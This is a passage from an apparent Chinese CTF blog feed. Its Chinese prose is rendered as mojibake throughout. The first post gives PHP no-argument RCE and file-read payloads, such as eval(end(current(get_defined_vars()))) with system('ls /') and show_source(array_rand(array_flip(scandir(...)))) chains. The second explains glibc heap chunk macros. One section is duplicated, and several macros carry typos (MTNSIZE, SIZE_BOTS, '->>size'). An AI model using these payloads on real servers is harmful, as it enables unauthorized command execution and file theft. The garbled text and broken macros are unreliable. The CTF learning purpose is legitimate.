style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>_FILES</p><p>â€‹ç”±äºé¢˜ç›®ä¸­è¿‡æ»¤äº†</p><p>â€‹é¦–å…ˆç¡®è®¤æ˜¯å¦æœ‰å›æ˜¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br></pre></td></tr></table></figure><p>â€‹å‡å¦‚è¯´åŸæœ¬åªæœ‰ä¸€ä¸ªå‚æ•° aï¼Œé‚£ä¹ˆå¯ä»¥å¤šåŠ ä¸€ä¸ªå‚æ•° bï¼Œåé¢å†™å…¥æ¶æ„è¯­å¥ï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure><p>â€‹æŠŠ eval æ¢æˆ assert ä¹Ÿè¡Œ ï¼Œèƒ½æ‰§è¡Œ system (â€˜ls /â€™) å°±è¡Œ</p><h1 id="5chdir"><a class="markdownIt-Anchor" href="#5chdir">#</a> 5.chdir()</h1><p>â€‹å®åœ¨æ— æ³• rceï¼Œå¯ä»¥è€ƒè™‘ç›®å½•éå†è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œä¸è¿‡è¿™é‡Œç”±äºé¢˜ç›®çš„è¿‡æ»¤æœ‰ç‚¹æ¶å¿ƒäººï¼Œæ‰€ä»¥åªå¥½è®°å½•ä¸€ä¸‹æ–¹æ³•äº†ï¼Œæœ‰äº†æœºä¼šå†è¿›è¡Œå®è·µã€‚</p><p>â€‹åˆ©ç”¨ <code>getcwd()</code>  è·å–å½“å‰ç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br></pre></td></tr></table></figure><p>â€‹ç»“åˆ dirname () åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•çš„çˆ¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•:.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br></pre></td></tr></table></figure><p>â€‹ è¯»ä¸Šä¸€çº§æ–‡ä»¶åï¼š</p><blockquote><p>?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</p><p>?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</p><p>?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</p></blockquote><p>â€‹è¯»æ ¹ç›®å½•:</p><p>â€‹ord () å‡½æ•°å’Œ chr () å‡½æ•°ï¼šåªèƒ½å¯¹ç¬¬ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè½¬ç ï¼Œord () ç¼–ç ï¼Œchr) è§£ç ï¼Œæœ‰æ¦‚ç‡ä¼šè§£ç å‡ºæ–œæ è¯»å–æ ¹ç›®å½•</p><blockquote><p>?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</p></blockquote><p>â€‹è¦ç”¨ chdir () å›ºå®šï¼Œpayloadï¼š</p><blockquote><p>?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</p></blockquote><h1 id="6array_randèµŒç‹—å¿…å¤‡æ³•"><a class="markdownIt-Anchor" href="#6array_randèµŒç‹—å¿…å¤‡æ³•">#</a> 6.array_rand ()# èµŒç‹—å¿…å¤‡æ³•ï¼š</h1><p>â€‹é¦–å…ˆï¼Œåœ¨è¿™é‡Œåæ§½ä¸€å¥ï¼ŒèµŒç‹—ä¸å€¼å¾—åŒæƒ… [doge]</p><p>â€‹å¯ä»¥é€šè¿‡ array_rand () å‡½æ•°éšæœºè·å–æ•°ç»„ä¸­çš„é”®ï¼Œå› æ­¤ï¼Œéœ€è¦æå‰å°†æ•°ç»„é”®å€¼å¯¹ç¿»è½¬ä»¥ä¸‹ï¼Œè®©åå†ä½¿ç”¨å¦‚ä¸‹ payload è¿›è¡ŒèµŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>â€‹å› ä¸ºè¿™ç§å¾ˆè€ƒéªŒè¿æ°”ï¼Œå› æ­¤ï¼Œå½“ç›®å½•ä¸­æ–‡ä»¶è¿‡å¤šçš„æƒ…å†µä¸‹åªæœ‰èµŒä¸€æŠŠè¿æ°”ï¼Œå¯èƒ½ä¸€ä¸¤ä¸‹å°±å‡ºäº†ï¼Œå¯èƒ½è¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œå› æ­¤ï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼ŒèµŒç‹—ä¸å€¼å¾—åŒæƒ… [doge]ã€‚</p><p>â€‹</p><h1 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™">#</a> å‚è€ƒèµ„æ–™ï¼š</h1><p>â€‹å¯ä»¥é€šè¿‡ array_rand () å‡½æ•°éšæœºè·å–æ•°ç»„ä¸­çš„é”®ï¼Œå› æ­¤ï¼Œéœ€è¦æå‰å°†æ•°ç»„é”®å€¼å¯¹ç¿»è½¬ä»¥ä¸‹ï¼Œè®©åå†ä½¿ç”¨å¦‚ä¸‹ payload è¿›è¡ŒèµŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>â€‹å› ä¸ºè¿™ç§å¾ˆè€ƒéªŒè¿æ°”ï¼Œå› æ­¤ï¼Œå½“ç›®å½•ä¸­æ–‡ä»¶è¿‡å¤šçš„æƒ…å†µä¸‹åªæœ‰èµŒä¸€æŠŠè¿æ°”ï¼Œå¯èƒ½ä¸€ä¸¤ä¸‹å°±å‡ºäº†ï¼Œå¯èƒ½è¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œå› æ­¤ï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼ŒèµŒç‹—ä¸å€¼å¾—åŒæƒ… [doge]ã€‚</p><p>â€‹</p><h1 id="å‚è€ƒèµ„æ–™-2"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™-2">#</a> å‚è€ƒèµ„æ–™ï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzIzMDFfNzY2OTA5MDUvYXJ0aWNsZS9kZXRhaWxzLzEzMzgwODUzNg==">https://blog.csdn.net/2301_76690905/article/details/133808536</span></p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ7ï¼‰--å †ç›¸å…³æºç </title>
      <link href="/posts/efb4c08.html"/>
      <url>/posts/efb4c08.html</url>
      
        <content type="html"><![CDATA[<h1 id="ç›¸å…³æºç "><a class="markdownIt-Anchor" href="#ç›¸å…³æºç ">#</a> ç›¸å…³æºç ï¼š</h1><h2 id="1-chunk-ç›¸å…³æºç "><a class="markdownIt-Anchor" href="#1-chunk-ç›¸å…³æºç ">#</a> 1. chunk ç›¸å…³æºç ï¼š</h2><p>â€‹å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œåªéœ€è¦ç¡®ä¿ malloc () å‡½æ•°è¿”å›çš„å†…å­˜ä¸ä¼šå‘ç”Ÿæº¢å‡ºï¼Œå¹¶ä¸”åœ¨ä¸ç”¨çš„æ—¶å€™ä½¿ç”¨ free () å‡½æ•°å°†å…¶é‡Šæ”¾ï¼Œä»¥åä¹Ÿä¸å†åšä»»ä½•æ“ä½œå³å¯ã€‚è€Œå¯¹äº glibc æ¥è¯´â€™å®ƒè¦åœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è°ƒç”¨ malloc () å‡½æ•°ä¹‹å‰å¯¹å †è¿›è¡Œåˆå§‹åŒ–ï¼›åœ¨ç”¨æˆ·é¢‘ç¹ç”³è¯·å’Œé‡Šæ”¾æ—¶ç»´æŠ¤å †çš„ç»“æ„â€™ä¿è¯æ—¶é—´å’Œç©ºé—´ä¸Šçš„æ•ˆç‡ï¼›åŒæ—¶è¿˜è¦æ£€æµ‹è¿‡ç¨‹ä¸­å¯èƒ½äº§ç”Ÿçš„é”™è¯¯ï¼Œå¹¶åŠæ—¶ç»ˆæ­¢ç¨‹åºã€‚</p><p>â€‹é¦–å…ˆï¼Œå…ˆç¨å¾®è¯´ä¸‹å‡ ä¸ªç›¸å…³çš„å®å®šä¹‰ã€‚</p><h3 id="request2size"><a class="markdownIt-Anchor" href="#request2size">#</a> request2size()ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)\</span></span><br><span class="line"><span class="meta">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MTNSIZE)  ?\</span></span><br><span class="line"><span class="meta">MINSIZE :\</span></span><br><span class="line"><span class="meta">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK(MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT(2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå®å°†è¯·æ±‚çš„ req è½¬æ¢æˆåŒ…å« chunk å¤´éƒ¨ï¼ˆpresize å’Œ sizeï¼‰çš„ chunk å¤§å°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼ˆMINSIZE é»˜è®¤ä¸º 0x20ï¼‰ã€‚</p><ul><li><p>å½“ req å±äº [0,MINSIZE-MALLOC_ALIGN_MASK-SIZE_SZ)ï¼Œä¹Ÿå°±æ˜¯ [0,9) æ—¶ï¼Œè¿”å› 0x20 ;</p></li><li><p>å½“ req ä¸º 0x9 æ—¶ï¼Œ è¿”å› (0x9+0x8+0xF)&amp;~0xF ï¼Œä¹Ÿå°±æ˜¯ 0x20 ï¼›</p></li><li><p>å½“ req ä¸º 0x18 æ—¶ï¼Œè¿”å› (0x18+0x8+0xF)&amp;~0xFï¼Œä¹Ÿå°±æ˜¯ 0x20:</p><p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ 0x18 çš„ user data åŠ ä¸Šå¤´éƒ¨ 0x10 å°±å·²ç»æ˜¯ 0x28 äº†ï¼Œä¸ºä»€ä¹ˆè¿”å›çš„ chunk å´æ˜¯ 0x20 ã€‚è¿™å°±æ˜¯å› ä¸ºå¦‚æœå½“å‰ chunk åœ¨ä½¿ç”¨ä¸­ï¼Œä¸‹ä¸€ä¸ª chunk çš„ prev_inuse æˆå‘˜å°±ä¼šå±äºå½“å‰ chunk ï¼Œæ‰€ä»¥å°±å¤šå‡ºäº† 0x8 çš„ä½¿ç”¨ç©ºé—´ã€‚è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œå½“ req åœ¨ 0x9~0x18 ä¹‹é—´æ—¶ï¼Œå¯¹åº”çš„ chunk å¤§å°ä¸º 0x10 ï¼›å½“ req åœ¨ 0x19~0x28 ä¹‹é—´æ—¶ï¼Œå¯¹åº”çš„ chunk å¤§å°ä¸º 0x20 ï¼Œå¹¶ä»¥æ­¤ç±»æ¨ã€‚</p></li></ul><h3 id="chunk2memå’Œ-mem2chunk"><a class="markdownIt-Anchor" href="#chunk2memå’Œ-mem2chunk">#</a> chunk2mem () å’Œ mem2chunk ()ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p)((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem)((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>â€‹chunk2mem () æŠŠæŒ‡å‘ chunk çš„æŒ‡é’ˆè½¬åŒ–æˆæŒ‡å‘ user data çš„æŒ‡é’ˆï¼Œå¸¸å‡ºç°åœ¨ malloc () å‡½æ•°è¿”å›æ—¶ï¼›mem2chunk () æŠŠæŒ‡å‘ user data çš„æŒ‡é’ˆè½¬åŒ–æˆæŒ‡å‘ chunk çš„æŒ‡é’ˆï¼Œå¸¸å‡ºç°åœ¨ free () å‡½æ•°å¼€å§‹æ—¶ã€‚</p><h3 id="chunkçŠ¶æ€ç›¸å…³"><a class="markdownIt-Anchor" href="#chunkçŠ¶æ€ç›¸å…³">#</a> chunk çŠ¶æ€ç›¸å…³ï¼š</h3><ul><li><p>å®šä¹‰ PREV_INUSEã€IS_MMAPPEDã€NONMAIN_ARENAï¼ˆchunk æ˜¯å¦å±äºéä¸»çº¿ç¨‹ï¼‰ä»¥åŠå¯¹ä¸‰è€…è¿›è¡Œæˆ–è¿ç®—ï¼ˆç”¨äºæ©ç ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when provious adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena .*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits to mask off when extracting size. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡ chunk æŒ‡é’ˆ p ï¼Œå¯¹æŸæ ‡å¿—ä½è¿›è¡Œæå–ã€æ£€æŸ¥ã€ç½®ä½å’Œæ¸…æ¥šæ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p)((p)-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p)((p)-&gt;size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_non_main_arena(p)((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)\</span></span><br><span class="line"><span class="meta">((((mchunkptr) (((char *)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)\</span></span><br><span class="line"><span class="meta">((mchunkptr) (((char *)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)\</span></span><br><span class="line"><span class="meta">((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;&gt;size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure></li><li><p>ç”±äºå½“å‰ chunk çš„ä½¿ç”¨çŠ¶æ€æ˜¯ç”±ä¸‹ä¸€ä¸ª chunk çš„ size æˆå‘˜çš„ PREV_INUSE æ¯”ç‰¹ä½å†³å®šçš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¸‹é¢çš„å®è·å¾—æˆ–è€…ä¿®æ”¹å½“å‰ chunk çš„ inuse çŠ¶æ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p,s)\</span></span><br><span class="line"><span class="meta">(((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p,s)\</span></span><br><span class="line"><span class="meta">(((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p,s)\</span></span><br><span class="line"><span class="meta">(((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span></span><br></pre></td></tr></table></figure></li><li><p>set_head_size () ä¿®æ”¹ size æ—¶ä¸ä¼šä¿®æ”¹å½“å‰ chunk çš„æ ‡å¿—ä½ï¼Œè€Œï¼Œser_head () ä¼šã€‚ seet_foot () ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ prev_size æ—¶ï¼Œå½“å‰ chunk ä¸€å®šè¦å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œä¸ç„¶ä¸‹ä¸€ä¸ª chunk çš„ pre_size æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p,s)((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BOTS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p,s)((p)-&gt;size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p,s)(((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p)((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure></li><li><p>next_chunk () å°†å½“å‰ chunk åœ°å€åŠ ä¸Šå½“å‰ chunk å¤§å°è·å¾—ä¸‹ä¸€ä¸ª chunk çš„æŒ‡é’ˆã€‚prev_chunk () å°†å½“å‰ chunk çš„åœ°å€å‡å» prev_size å€¼è·å¾—ä¸Šä¸€ä¸ª chunk çš„æŒ‡é’ˆï¼Œå‰ææ˜¯ä¸Šä¸€ä¸ª chunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚chunk_at_offset () å°†å½“å‰ chunk åœ°å€åŠ ä¸Š s åç§»å¤„çš„ä½ç½®è§†ä¸ºä¸€ä¸ª chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p)((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p)((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p,s)((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="chunk-åˆå¹¶è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#chunk-åˆå¹¶è¿‡ç¨‹">#</a> chunk åˆå¹¶è¿‡ç¨‹</h3><p>â€‹å½“ä¸€ä¸ªé fast bin çš„ chunk è¢«é‡Šæ”¾ï¼Œä¼šä¸ç›¸é‚»çš„ chunk è¿›è¡Œåˆå¹¶ï¼Œé¡ºåºé€šå¸¸æ˜¯å…ˆå‘åï¼ˆä¸Šï¼‰åˆå¹¶å†å‘å‰ï¼ˆä¸‹ï¼‰åˆå¹¶ã€‚å¦‚æœå‘å‰åˆå¹¶çš„ chunk æ˜¯ top chunk ï¼Œåˆ™åˆå¹¶ä¹‹åä¼šå½¢æˆæ–°çš„ top chunk ï¼Œåˆ™åˆæˆä¹‹åä¼šå½¢æˆæ–°çš„ top chunk ï¼›å¦‚æœä¸æ˜¯çš„è¯ï¼Œåˆ™åˆå¹¶ä¹‹åä¼šè¢«åŠ å…¥ unsorted bin ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    nextchunk = chunk_at_offset(p,size);</span><br><span class="line">......</span><br><span class="line">    <span class="comment">/*å‘ååˆå¹¶ï¼Œä¸Šä¸€ä¸ª chunk æ˜¯é‡Šæ”¾çŠ¶æ€å°±è¿›è¡Œåˆå¹¶ã€‚æ–° chunk åœ°å€ä¸ä¸Šä¸€ä¸ªç›¸åŒï¼Œå¤§å°ä¸º p-&gt;size+p-&gt;prev_sizeï¼Œå³på‡å»prev_size */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p,-((<span class="type">long</span>) prevsize));</span><br><span class="line">        <span class="comment">//åˆ°è¿™é‡Œå·²ç»å½¢æˆäº†æ–°çš„ free chunk ã€‚ç”¨ unlink() å°†å…¶ä»åŒé“¾è¡¨ä¸­åˆ é™¤ã€‚</span></span><br><span class="line">        unlink(av,p,bck,fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;<span class="comment">//æ£€æŸ¥ä¸‹ä¸€ä¸ª chunk æ˜¯ä¸æ˜¯ top chunk</span></span><br><span class="line">        <span class="comment">//å¦‚æœä¸æ˜¯ï¼Œé€šè¿‡æ£€æŸ¥ä¸‹ä¸€ä¸ª chunk çš„ PREV_INUSE æ£€æŸ¥ä¸€ä¸ª chunk çš„çŠ¶æ€ï¼Œå¹¶æ¸…é™¤ inuse ä½</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk,nextsize);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;<span class="comment">//å¦‚æœä¸‹ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€åˆ™æ‰§è¡Œå‘å‰åˆå¹¶æ“ä½œ</span></span><br><span class="line">            unlink(av,nextchunk,bck,fwd);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125; <span class="keyword">else</span><span class="comment">//å¦åˆ™æ¸…æ¥šä¸‹ä¸€ä¸ª chunk çš„ PREV_INUSE</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å…ˆå°†åˆå¹¶åçš„ chunk åŠ å…¥ unsorted bin ä¸­</span></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikey (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line">        </span><br><span class="line">        set_head(p,size | PREV_INUSE);</span><br><span class="line">        set_foot(p,size);</span><br><span class="line">        check_free_chunk(av,p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//å¦‚æœä¸‹ä¸€ä¸ª chunk æ˜¯ top chunkï¼Œåˆ™åˆå¹¶æˆæ–°çš„ top chunk</span></span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p,size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av,p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="chunk-æ‹†åˆ†è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#chunk-æ‹†åˆ†è¿‡ç¨‹">#</a> chunk æ‹†åˆ†è¿‡ç¨‹ï¼š</h3><p>â€‹å½“ç”¨æˆ·ç”³è¯·çš„ chunk è¾ƒå°æ—¶ï¼Œä¼šå°†ä¸€ä¸ªå¤§çš„ chunk 